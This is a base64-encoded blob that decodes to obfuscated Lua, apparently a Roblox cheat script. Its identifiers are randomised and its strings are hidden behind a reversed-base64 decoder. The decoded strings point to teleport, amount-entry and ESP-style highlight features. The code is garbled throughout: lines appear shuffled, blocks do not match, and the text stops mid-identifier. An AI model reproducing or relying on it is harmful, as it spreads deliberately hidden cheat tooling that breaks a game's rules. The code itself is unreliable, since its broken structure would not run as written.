WGZaLmtyZWJLeEpoUWsgPSB0cnVlCiAgICBpTGRvcEdXVUtSID0gQ1BncHB1eGJOVzpEd2FmUkJvQ2ViKHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWhMaWFxc0RUaHUiKSwgY1BoWGVwWWVOYSA9IFdETVBoQWFBb20udHRCQnpoWlRISygieUFHWndGY0V2QiIpfSksCiAgICAgICAgbG9jYWwgZWhMZHdnUGRiWSA9ICh6Vm5sSW5selBOID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1RSm9RVGtFRmh3IikpIEJ4dFBVZlRSVEogODAgRWNJeXBPa1FZVSAxMAogICAgICAgICAgICBmdW5jdGlvbigpCmxvY2FsIGtuTndIenJCS1EgPSB7CiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCgoKICAgICAgICAgICAgICAgICAgICBlbmQKKQotLSBvbVBObVJmSldUIGJmV09KTFdack4gV0l3SUlCakt1eSBoelBud3NKaWVwIChvekxKd01NekJSIFROaHJwTWVSVXQgdkpMb2hudkphZCBFb2VGTExHQlVkICYgYXV1ZVdoYU5ZYSkKICAgICAgICAgICAgICAgICAgICAgICAgdkhTb0R5TmNyRS50ZFNnTnJJU0pzID0gZmFsc2UKKQogICAgICAgICAgICAgICAgZ25leFJkaENWbCA9IHRydWUsCiAgICBlbmQKICAgICAgICBGQXdRVEpmYWlzID0gdHJ1ZSwgLS0gbU9HZ1BLdk9PRiBPYVFaeWZmYWFHIE1OWE5aY1ZLTk0gUVNwaWV6R3ljRwogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImljUm5sTXJvQnMiKSwKICAgICAgICAgICAgICAgIGlmIHpEQ2hTSGVLcWEuZ25leFJkaENWbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgUWVKTUxTRENiUCBCeHRQVWZUUlRKIFFlSk1MU0RDYlA6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImNoaHp1blNvTEoiKSkgdGhlbgpsb2NhbCBqWmRzTU90aWdhID0gY1RRZFJNSFBiVS56WHhYdENodGR5OkVtUnhnS3hRdWYoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJlRUxRcWhLUFRoIiksIHsKICAgIGVuZAogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJMQUlSZENTeFFWIiksCiAgICAgICAgc0lGTU5iTWlwUSA9IDUwLAogICAgICAgIFB1THFCQ0xpWGYgYkVoSXFUem9UdCBaa1VSZ3RjbVBCIEJ4dFBVZlRSVEogQ21ldm5iakJQWigpIC0gSGFJcEVWZGZTYSA8IDEwIExKV1RkYlBhbHcKICAgIGVuZAogICAgcmV0dXJuIFFnTFVDa090YlIsIHJ0WVlKWVFwb1UKICAgICAgICAgICAgaWYgc2x0UG1KTHltdiB0aGVuCiAgICBmdW5jdGlvbihWTVJqZUNlYklNKQoKICAgIGlmIHNjVVloRHFBTFMgdGhlbgoKICAgICAgICBBcGJMeWdUakNOID0gREtPZ2hkanByYwotLSB5Wlhma0VYUENtLnRqdVdsVHNYemUgPSBmUHZoTnRJTFN4CiAgICAgICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1IRm1teWJCbGRzIiksCiAgICAgICAgICAgICAgICAgICAgICAgIHdWTW5sUFJhSmEgPSBtWGxzQ3B4TnZyLmxhaW5Pa2dLZncob0hNTVN6Q0ROdS5tWGxzQ3B4TnZyLldncnZsYmx2TGYgKyB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoMCwgNzQsIDApKQoKCmxvY2FsIHpueG9tVUNRcXMKICAgICAgICAgICAgLS0gZGVCck1tT2lkSiBsZkdmUEpTU1ZjIFpmdXdTZWlpUkYgZnVuY3Rpb24ga05Za0pqd3dteCBXeWVZVk9BbWx6CiAgICAgICAgaVJtZHZUTE9SSiA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1CSklOUE93ek5QIikgRWNJeXBPa1FZVSB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9TmhwTUF0U21GSCIpIHRoZW4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIC0tIHFYZHd2S1VydlogQWxtR1FieEJxdSBhbGVBVmZxc3h4IEZsY1lMc0lmU3kgdldRZ1BTYmVHVQogICAgICAgIC0tIFlTZ1JJeEttV3EgeUlOYnd0UWJvTAogICAgICAgICAgICAgICAgICAgICAgICBnWnBSWnRGeEJoLlpZcUx3SXNibG4oWGpZTlRiRVRGbCwgMSwgdkhTb0R5TmNyRSkKICAgICAgICAgICAgICAgICAgICApCmZQdmhOdElMU3guSnRoZnpLSVdoVyA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLCAxMjAsIDAsIDUwKSAtLSBSV2hod0lOTUZqIG1EdXZnUXdpbU8gS2xiRlZIUHRlTCBpc1lRQVROUFFBIFZtcFdJd3JKenYgUUpWak1nemdKRwogICAgICAgICAgICB9CiAgICAgICAgZW5kCmxvY2FsIGZ1bmN0aW9uIE5LTUl0SE1YZ1koSER2S3dtVXJlRikKCnl6UVB0ZFJSWkYudGp1V2xUc1h6ZSA9IElSd1ZsTEhLTXUuc29PTnRIandsUwpsb2NhbCBlQ0loUlVRZ1BzID0gdE5FeEhpVVRsVChJUndWbExIS011OlFaS1hraWtDaXcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9VlFkZXBMTU9mVCIpKSkoKQogICAgICAgICAgICB9CiAgICByZ3JnREhGdkZFLkdURXlJQnV1S0UgPSB0cnVlCiAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDAuNSkgLS0gS0xQd0Ric0hEUSBTdFdMZ1pUZFduIDAuNSBhZU5QUXZVSFBnCiAgICBpZiBycHRZRkFpb2dXIEJ4dFBVZlRSVEogI3JwdFlGQWlvZ1cgPiAwIHRoZW4KICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVZoSG5EYmlJT1UiKSwKCiAgICAgICAgICAgIHFHS1pEbk9La2soV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9SUloU1BZTmhJQiIpLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIldyckliWk9xU1ciKSwgMykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29pYW1IYWZMWCB0aGVuCiAgICAgICAgICAgICAgICAgICAgWFlwSEJDc0J6eSgKICAgIGNUUWRSTUhQYlUuaUxkb3BHV1VLUjp4Y1Z4Z21nTWJRKAogICAgICAgIGVuZAogICAgICAgICAgICAgICAgV2dydmxibHZMZiA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLjUsIDAsIDAuNjUsIDApIC0tIE9NWmVmcUNJa3cgTXFjd0JsaVZ5ciBwWlJ3ZFRBQlZjLCByY2xlbW9ZV29QIFZtcFdJd3JKenYgVW9aQ3ZxZ1NWciBuRVJKWnJhc0ZKCiAgICBmdW5jdGlvbigpCiAgICAgICAgZW5kKQogICAgY1RRZFJNSFBiVS5pTGRvcEdXVUtSOmJwQlJoV2NGY3AoCkFZbHhzRGpOblEubmRrSHJYTkVnSSgKICAgICAgICAgICAgaWYgbEZ2anJKR21tVDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1jWmVDVkVmcURrIikpIHRoZW4KICAgIHFMTWhydm9kTVkgPSBDUGdwcHV4Yk5XOkR3YWZSQm9DZWIoe3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09am5VeWVlWnhkbSIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwWWpNMlVUTndJek0zRXpMdm9EWnBSWFp6TlhZNEptYyIpfSksCiAgICAgICAgLS0gZndJaHRxaFpReSBWdExsdHRKb3BtIHpOeGxreU9zeGkgYmZXT0pMV1pyTiBYeU9nU2RncUxiIGNISlZJZm1JUEouZkpKUFNiRnBFcgogICAgICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwSjNid1ZHYmxSRkl2UkhJdTlHZDBWblFnczJZcHgyUSIpLAogICAgICAgICAgICBsb2NhbCBOWFVKT1RjVWpxID0gZENhbFBUQUJ5Ry5IZ3NEbW5YeWdXCiAgICAgICAgICAgIGlmIGxGdmpySkdtbVQ6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Y1plQ1ZFZnFEayIpKSB0aGVuCgogICAgICAgICAgICBpZiBkaXNiRkhpWU5MOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW9oWnhoVHN1a00iKSkgdGhlbgpsb2NhbCBkRW15WUNSUktTID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFB5ZHhUeHNFREEuRE52T0lzTVhWZS5VY01CT3JOdXZkOlBuSlZxektRRGooKQogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgTE9Ec25Hb0l6RS5MZXl3WkJaYU54ID0gWmNmb1ZCc29EQS5nR0t0UlFDa0VSCiAgICAgICAgbG9jYWwgTWVUWUZKdUVxbyA9IHlsdWttUnhpUGUuSGdzRG1uWHlnVwpBWWx4c0RqTm5RLkZoV1pXQk9hU2woCikKKQoKICAgICAgICAgICAgaWYgT0NyQmR6Z1VXaC5IZ3NEbW5YeWdXIHRoZW4KICAgIH0KICAgIGNUUWRSTUhQYlUuelh4WHRDaHRkeTpBelNYQVJQblpQKApsb2NhbCBOQVRDUXBwVkFRID0KICAgICAgICBDamRxdHFzUWxJID0gSGdzRG1uWHlnVwotLSBIbGxPbnNBbXhCLnRqdVdsVHNYemUgPSBmUHZoTnRJTFN4CiAgICAgICAgICAgICAgICB5T3FDdWNxUm9zLnd5YWZYRmFwcnYgPSBaY2ZvVkJzb0RBLmdHS3RSUUNrRVIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIElHTkZ5d012dmYgdGhlbgopCiAgICAgICAgSklTaVF2ZE5oTiA9IFBuUVRRRWVsV0kuT2VhQ2diRGpUYy5IZ3NEbW5YeWdXCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZE5aUVN6UWpNbyA9IG5pbCAtLSBHem9oVGlvQWNqIGlzWVFBVE5QUUEgckpWRnZxQmtIWiBCUFllV1FLQ2tOIHZNa21yT3VSVVQgb0lNTWlSVXJ0eiBBbmlqWVJVa2hVIGZXQm5iQ1pwUUMgdldRZ1BTYmVHVSB2Qm1qYmRPT2NNIFdqWXZNSHhpbkwKICAgICAgICAgICAgICAgICAgICAtLSBGY0x6T1hsbXRIIGFsZUFWZnFzeHggRXVpUGlOZGdoRyBjVEFrcG1PQ2NJCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBtdFVER2l1Z0NLID0gQ2tYZE1EcVJCWi53eXBEcUxIYVF4KHVCRFptcGdYRnkpCiAgICAgICAgVWNNQk9yTnV2ZDpjemVRdHBkVlVYKHFaS0llTmlXR3UubUVic0RLYkRQWi5hdVRackFPVEhiLCB0cnVlKQogICAgICAgIGVuZAotLSBNSGlwbHpQV1d4IGJmV09KTFdack4gc01SS1ZjaGxJZyBBZXdWTERjeVBFIHVpbEpyYVVSZkogV3pLd29WcnFQbCBpc1lRQVROUFFBIFllcmNsdENBeVYgVE5ocnBNZVJVdAogICAgICAgIHZObm1IbklYY1c6SWNlRlVobnZxcygwLCAwLCAwLCB0cnVlLCBJUndWbExIS011LCAwKSAtLSBlS2pqR0hOd3pkIFNBa2VBc3VHRVQgWVd1V0p1aGZaTwogICAgewogICAgICAgIHlYa1pIV0hhWU4gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjA1V2R2MVdZZ0lYWjA1V1IiKSwKICAgIGNUUWRSTUhQYlUuaUxkb3BHV1VLUjpFbVJ4Z0t4UXVmKApNcHBiaVhYYW9JLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09U1RnbE9rYlRMYSIpIC0tIGpxZ2lscGJDT1ogVWFUdHJVd2RpcAotLSAtLSBhS2xRTXFHbWxZIFJaRFdnV25jckEgYmZXT0pMV1pyTiBCak5ubVJzS25aIFB3cFF0TkdDaFUgS1dMTW1aa1loagogICAgICAgICAgICAgICAgICAgIG9ITU1TekNETnUgPSBzR0xUUk9lRnRvLkRCZEtabG1JekYuVWFLRlVQaHRTdDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPU9IYUpBakVFbnYiKSkKbG9jYWwgVnJGS2twQlhCVSA9CiAgICAgICAgICAgICAgICBlbmQKLS0gaE5wb0VKRHNkcCBgVVJRSW1vdWR6by5IcUpnbnh2YWlNYCBIRWx6bFdOSG1GIGtTSHF4QU5TWEMgQ0ttdURNQWpFTyBYY2FRRk9SaVRKIHZrZFdLZ3lJeEkga3JvT3lSdlNSQy4KCi0tIE1IaXBselBXV3ggYmZXT0pMV1pyTiBOblBKa2RObEtZIEtXTE1tWmtZaGogVnVYVXJPZnpUVCAocFRJZmNuU2dBZyBFRURKd0xIUHllIG91ekJ4ZWtsaEgpCiAgICAgICAgRWN6dmpVTlJGSTpjbkVsT3VWc1lIKCkKCmxvY2FsIHlsdWttUnhpUGUgPSBjVFFkUk1IUGJVLkhxSmdueHZhaU06YnBCUmhXY0ZjcChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIk1jSUdycG5jQ00iKSwge3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09ZG1DTmlxcnV5aSIpLCBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpYWZ3SFRmZ2dOIiksIHNJRk1OYk1pcFEgPSB0cnVlfSkKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJIZ2JyV0lneEVMIiksCiAgICAgICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1KSWZXYk54eHZSIiksCnBubnBGdFFvb2o6SlBFc29na2diVCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBFQ2lKd0xTWkp5IHRoZW4KICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgSHRmbE1va1l4TiA9IFBhanZQam5teFAuRE52T0lzTVhWZSBFY0l5cE9rUVlVIFBhanZQam5teFAuQUhkVHZja29uYzpWUHpXV05vZk5mKCkKICAgICAgICBzSUZNTmJNaXBRID0gSkR3cEpGa1dseAogICAgcUhZU1VnV1R5RSA9IGZhbHNlLAoKLS0gYldzQnJITlJoWC9ybXhCUkxnUUNrIGpTSUhGd3BDeFgKLS0gb3VObGdhUmtmWC5DdmdMcGpqcUJKID0gemdMUHFDS1NGWC5sYWluT2tnS2Z3ewogICAgewoKLS0gaE5wb0VKRHNkcCBPS3FJclpyd2RuIFJSanhaYVd5Z2MgSkFWQ2NNYmlJSgotLSBrekRvV2xyT3FTIGJmV09KTFdack4gWHBOTHR0aG1aeCBDd25hUVBjUXBsIGx1Z0tab3JlREwKICAgICAgICAgICAgZnVuY3Rpb24oKQotLSBGQmxWaEJTSm1QIFdETVBoQWFBb20udHRCQnpoWlRISygidnh4TWp2WVZkUyIpCiAgICAgICAgZW5kCiAgICAgICAgLS0gcGRyQVpkdkJVSyBWdVhVck9melRUIExqdUVzRW5UU1YgZXRnY2R3SVhHcyQgTU5YTlpjVktOTSB2T3RYUHZHY2F3IENLbXVETUFqRU8gelJUSFRZdlFlYSBLV0xNbVprWWhqCk1wcGJpWFhhb0kuV2dydmxibHZMZiA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLjUsIDAsIDAuNDUsIDApIC0tIHFta3hOenpLTkEgbUR1dmdRd2ltTyBxeXViRFVER1FsIGZVYWRhV1VkSHUgclJpeFdMdEd6QQoKICAgICAgICAgICAgZW5kCiAgICBsb2NhbCBlUEx5V3picHZsID0ge30gCi0tIFlTZ1JJeEttV3EgTmJNdlBOb3VmRiBWdVhVck9melRUIERTTU5CS0xmcVQgSWlWTWVCWnJ4RgoKbG9jYWwgc0ZIbFBGVWJGaiwgWFFrTlBvbXNGbSA9IG5pbCwgbmlsCiAgICAgICAgUXlyR2ZCTlhTRCgpCiAgICAgICAgICAgIEFZbHhzRGpOblEuRmhXWldCT2FTbChqY0RzVGFXdHVQKQogICAgbG9jYWwgRE52T0lzTVhWZSA9IFB5ZHhUeHNFREEuRE52T0lzTVhWZQogICAgICAgIH0KICAgIHsKICAgICAgICBlbmQgLS0gWnhvcU1xbElrbSBPUmdvcGdKZGdwIGNxb0hSeEtkZHMgYmZXT0pMV1pyTiB5cG1JcXVBVnROCiAgICBoWFRtWGtzRkpPIFBjcGNya1JsQnosIEpqWmxQU3ZtQU8gSlpsb3VocEhsVCBueE9nUmphd2ZFKFFnTFVDa090YlIpIExKV1RkYlBhbHcKICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJVd29UWUlyb2N4IiksCgotLSB3Y3lKeWVjVWdTIFRCZnFpTUlxZlAtSlpsb3VocEhsVApjVFFkUk1IUGJVLnpYeFh0Q2h0ZHk6YnBCUmhXY0ZjcCgKLS0gSnlzQ1JuZEpQWCBFSEtsc29CZHRTIFdJd0lJQmpLdXkKICAgICAgICAgICAgLS0gSVRpS210TWhVVDogS0xQd0Ric0hEUSBJQVFoSXNITm52IFFvSXRCeFZLdUEgVVVKYUFqVk9jaCBnT095QlFMaVVVLWdPT3lCUUxpVVUgZGRzR0tkQkZ1bgogICAgICAgIC0tIHBkckFaZHZCVUsgVnVYVXJPZnpUVCBpZUdXT1Z3UkRsIHpTdGFXVlVZUGwKZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIFB1THFCQ0xpWGYgb2JQS2h5b3VnVC50anVXbFRzWHplID09IHBTUGhOckZZTGkgTEpXVGRiUGFsdwogICAgICAgICAgICBpZiBSZ3JhdVloTWhzIEJ4dFBVZlRSVEogUmdyYXVZaE1ocyA+IDAgdGhlbgplbmQKICAgICAgICAgICAgZW5kCmxvY2FsIFNuRkNiWmpYdm8gPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9amVXeXhoUFNMUCIpKQogICAgICAgICAgICBoWFRtWGtzRkpPIG5odVVmUkh2V3QgPSAxLCBXVkRMcFFsWUFRIExKV1RkYlBhbHcKICAgICAgICAgICAgY056a0FGUHJuaCgpCiAgICAgICAgCiAgICAgICAgLS0gY3pUaUJMUVRSeiBnYWpQSlhiQmVrIEV1aVBpTmRnaEcgaU9jVVNWWGFnTwogICAgICAgICAgICBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9amVXeXhoUFNMUCIpKTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPXhwZmZzdHJrY0MiKSkgQnh0UFVmVFJUSgogICAgY1RRZFJNSFBiVS5nanVsRnBJSkVHOmJwQlJoV2NGY3AoCiAgICAgICAgIHRoZW4KICAgIGVuZAogICAgICAgIGxvY2FsIGZFVnNLb1NGZVEgPSB7fQogICAgICAgIHJldHVybgoKICAgICAgICAgICAgaWYgSW55UFJIcmhXVTpSZ3Rvb2dFZ21lKERLT2doZGpwcmMsIDEsIHRydWUpIHRoZW4KICAgICAgICBGQXdRVEpmYWlzID0gdHJ1ZSwKICAgICAgICAgICAgICAgIGxGdmpySkdtbVQucUJKU2FHcVVXcS5SZXFUZW1jc3dlID0gdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDE4MCwgMTgwLCAxODApCikKCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGNISlZJZm1JUEouYWxlQVZmcXN4eCA9IEdSdEVmbHdYR3cKICAgICAgICBpZiBQblFUUUVlbFdJLlNLb2V4bE9OVEouSGdzRG1uWHlnVyB0aGVuCikKCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09WXZQaU9XWWhPZyIpLAogICAgICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09VVFVdVFQQW1ieSIpLAogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09ZUlFdlJPeXVQRCIpLAoKQVlseHNEak5uUS5GaFdaV0JPYVNsKAoKbG9jYWwgSEJRbVlqQUlrayA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImlidkRBUUJudG8iKSwgcFNQaE5yRllMaSkKCgogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3libW1vakJLai5XZ3J2bGJsdkxmID0KICAgICAgICB5WGtaSFdIYVlOID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Y0RhbFF6SkN6ayIpCiAgICAgICAgcUhZU1VnV1R5RSA9IGZhbHNlLApjVFFkUk1IUGJVLkhxSmdueHZhaU06QXpTWEFSUG5aUCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBxTkZLSm9zT3JZIHRoZW4KbG9jYWwgY1RRZFJNSFBiVSA9IHsKCn0KICAgICAgICBpZiB2Rm9PRG5vdGFVOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwNVdadDVtY3ZSV1FseEdadUZHUzQ5bVEiKSkgQnh0UFVmVFJUSiB2Rm9PRG5vdGFVLnVpbEpyYVVSZkogPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUhMcGFWQ2NNQXUiKSB0aGVuCiAgICAgICAgfQogICAgLS0gRmNMek9YbG10SCBFcUlqY2ZLVEVqIGZXQm5iQ1pwUUMgdldRZ1BTYmVHVSBaQWhoVHRFTmx6CiAgICByZXR1cm4KZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHpOV0NjcWZDSmIgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ1cGp5TU5zclJOIikgdGhlbgogICAgWlFlRVp6UkFaeSBCeHRQVWZUUlRKIHBTUGhOckZZTGk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09d3NNclJGbWdvbiIpKSBCeHRQVWZUUlRKIHBTUGhOckZZTGkubndBWVhnTHZzSTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPUp5ZnZJQ1NKcmUiKSkgQnh0UFVmVFJUSgoKICAgICAgICAgICAgUXBRQ3pCVVZDZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09bFR2Y1hrZkhqVSIpKQogICAgICAgICAgICBpZiBOQVRDUXBwVkFRIHRoZW4KICAgICAgICBsb2NhbCBKWFFOZ0lJVktXID0gewogICAgICAgICAgICBpZiBOQVRDUXBwVkFRIHRoZW4KICAgICAgICB2WWtUdWladlZkLlpMT1hSSkZzUHQ6SlBFc29na2diVCgKKQogICAgICAgICAgICBQdUxxQkNMaVhmIFdpWFBZQ3BYaEUgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgaWYgR1J0RWZsd1hHdyB0aGVuCiAgICBjVFFkUk1IUGJVLmdqdWxGcElKRUc6YnBCUmhXY0ZjcCgKbG9jYWwgZE5aUVN6UWpNbyA9IG5pbCAtLSBxT1VSWkxCc2dnIHJKVkZ2cUJrSFogQlBZZVdRS0NrTiBjcW9IUnhLZGRzIGZXQm5iQ1pwUUMgdldRZ1BTYmVHVSB4WXZIbUJJZEJvIENkcGhGV0lEaUwgVEhta3BZbERVUQogICAgICAgICAgICAgICAgICAgICAgICBnWnBSWnRGeEJoLlpZcUx3SXNibG4oWGpZTlRiRVRGbCwgMSwgdkhTb0R5TmNyRSkKZW5kCgoKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWRYeEJhYWlHZG0iKSwKICAgIH0KICAgIGVuZAogICAgICAgIGxvY2FsIGJtVWx2Ym1IU08gPSBtelFCYmRyUXhULnZOclh2SW1QTEI6bnp2RnhUQ0RjRChmdW5jdGlvbigpCiAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbEZ2anJKR21tVC5UTkJoWlVHTmZhLmd0RExwYnpNbXYgPSBrbk53SHpyQktRLk9XUVZjQnRYS3gKICAgICAgICBpZiBOZFNna2h4dmRNLnVpbEpyYVVSZkogPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXdzTXJSRm1nb24iKSBCeHRQVWZUUlRKIE5kU2draHh2ZE06VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImlidkRBUUJudG8iKSkgdGhlbgogICAgZnVuY3Rpb24oKQogICAgICAgICAgICBlbmQKICAgICAgICBKdGhmektJV2hXID0gUXN5Q3duUE1VWS5ieXNHVUNveGRQKDQ5MCwgMzUwKSwgLS0gUldoaHdJTk1GaiBtRHV2Z1F3aW1PIEJqSHNDZmpJRHYgaXNZUUFUTlBRQSBtRHV2Z1F3aW1PIE5zbUpNRmZDUksKICAgIH0KLS0gICAgIC0tUm5Yc2dNQ2lZTiBtQk5DV1dQQkJwIERoeEhUSkdkRVMgQWtlRUVXUnhkaC0tCiAgICBjeW1rR1llV3RJOmN5T2dWR2lBcHkoCiAgICAgICAgICAgICAgICByTkNSQmFVR3JGKCkKKQogICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ncHJSVHlPbE9xIiksCiAgICAgICAgICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1xRnhTYmRrc3JOIiksCgogICAgICAgICAgICAgICAgZVBMeVd6YnB2bFtJbnlQUkhyaFdVLnVpbEpyYVVSZkpdID0ge30KICAgICAgICBpZiBkRW15WUNSUktTIHRoZW4KICAgIGVuZAogICAgICAgICAgICAgICAgICAgIE5BVENRcHBWQVEuSGlERlFZRHVDbC5ndERMcGJ6TW12ID0ga25Od0h6ckJLUS5YcUdzTXlieHp3CiAgICBlbmQKICAgIGVuZAoKCgogICAgICAgICAgICAgICAgeW5TaklRRG5OcyA9IG5pbAogICAgICAgICAgICAgICAgUHlkeFR4c0VEQS5ETnZPSXNNWFZlLlVjTUJPck51dmQ6eUl3UnpURHZrSShIUFpzUHNsa1ZBOndOcUppVGR5cFUoTGZpYXhoSGxpVykpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgIGVuZAogICAgICAgICAgICBlbmQKKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIFlYbU1qWW9jTnAubGFpbk9rZ0tmdygxLCBxWktJZU5pV0d1LnhjZW5LaE5vUFguRWFvU2J1YXRrRCwgcVpLSWVOaVdHdS5ETHRLbWxtRGdTLmJRcUpsQVRCQm0pLAogICAgICAgICAgICBzWlhtTUZZVXFOID0gNQogICAgICAgIGlmIGRKS3JGbVdweVggdGhlbgpsb2NhbCBPQ3JCZHpnVVdoID0KICAgIGVuZAoKICAgICAgICBsb2NhbCBMZmlheGhIbGlXID0gU25GQ2Jaalh2by5kalVDTm9MZVhUW1B5ZHhUeHNFREEudWlsSnJhVVJmSl0uTWtobHVWVlBpbi5Cb0xodmZ5WkptLkhnc0Rtblh5Z1cKICAgICAgICAgICAgZnVuY3Rpb24oREtPZ2hkanByYykKRlFISXZMY1VaTS56dUVSWWFOUk1OID0gYlZNakVSallUVC5sYWluT2tnS2Z3KDAsIDgpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb2lhbUhhZkxYID0gUHlkeFR4c0VEQS5ETnZPSXNNWFZlOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWdIekFlV1F2TkEiKSkKLS0gdWdBSU50QlBoeiBOQmZBTmNMQ2dVCgotLSBEaUtPQ2RTb0pHLkp0aGZ6S0lXaFcgPSBRc3lDd25QTVVZLmxhaW5Pa2dLZncoMCwgMjQsIDAsIDI0KSAtLSBSV2hod0lOTUZqIEpyTVdaTVlxYWMgcFRFWUd0ZUlFRwogICAgewogICAgICAgIGtGcGJYTmlJRE8gPSBmdW5jdGlvbihzY1VZaERxQUxTKQoKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW1QU0ZEdnlKaFYiKSwKTXBwYmlYWGFvSS50anVXbFRzWHplID0gZFBpUWJNclFqSwogICAgICAgICAgICAgICAgaWYgREtPZ2hkanByYyB+PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIiIpKSkpKSkpIEJ4dFBVZlRSVEogbEZ2anJKR21tVDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1jWmVDVkVmcURrIikpIHRoZW4KZW5kCmVuZAoKICAgICAgICAgICAgZW5kCmxvY2FsIGRGUmZEc3d0VGIgPSBjVFFkUk1IUGJVLmlMZG9wR